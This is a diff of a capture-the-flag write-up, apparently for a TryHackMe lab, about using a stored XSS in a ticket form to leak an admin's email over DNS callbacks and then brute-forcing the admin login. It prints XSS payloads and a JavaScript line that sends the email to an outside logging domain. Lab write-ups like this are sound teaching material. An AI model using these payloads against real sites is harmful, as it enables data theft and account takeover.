@@ -73,24 +73,25 @@ nikto -h 10.10.28.159
 Hint: Our HTTP & DNS Logging tool on http://10.10.10.100 may come in useful!
 ```
 
-## Dns time
+## DNS time!
 
 Using the found xss bug we can use this to make callbacks to our machine and from the hint we got earlier. 
 http://10.10.10.100 This is a DNS service that logs dns calls for us. We can also use a site like this, http://pingb.in/
 
 Knowing we can use xss lets try a call back to the dns service. 
 
-![](/assets/test.png)
-
 ```js
-</textarea><img/src=x onerror"//8ba7c46d7ea59d575b71ef3126651b6a.log.tryhackme.tech/"/>
+</textarea><img/src=x onerror="//8ba7c46d7ea59d575b71ef3126651b6a.log.tryhackme.tech/"/>
 ```
 
 This gets the call back four times, 3 from us and once from the server (admin is looking)
 
 ![](./assets/recievedadmin.png)
 
-Now lets try to get some data back! 
+Now lets try to get some data back!
+
+I tried cookies for a while but realised we only needed the admins email (always keep in mind the scope and spec!)
+
 New payload
 
 ```js
@@ -106,7 +107,7 @@ After a little while, I decided to try a subdomain.
 
 This came back! 
 
-pic
+![](./assets/test.png)
 
 Now we can get the admins email address, but we will have to swap a few charaters to not break the url to the dns service (escaping chars like @.')
 
@@ -119,13 +120,13 @@ document.location = "http://"+ email +".8ba7c46d7ea59d575b71ef3126651b6a.log.try
 ```
 Press Create ticket and check the results on the service http://10.10.10.100
 
-pic
+![](./assets/admin.png)
 
 We see the admin email and ours!
 
 Now we can brute force the login page for the admins password as we have his email now.
 
-pic
+![](./assets/flag.png)
 
 
 
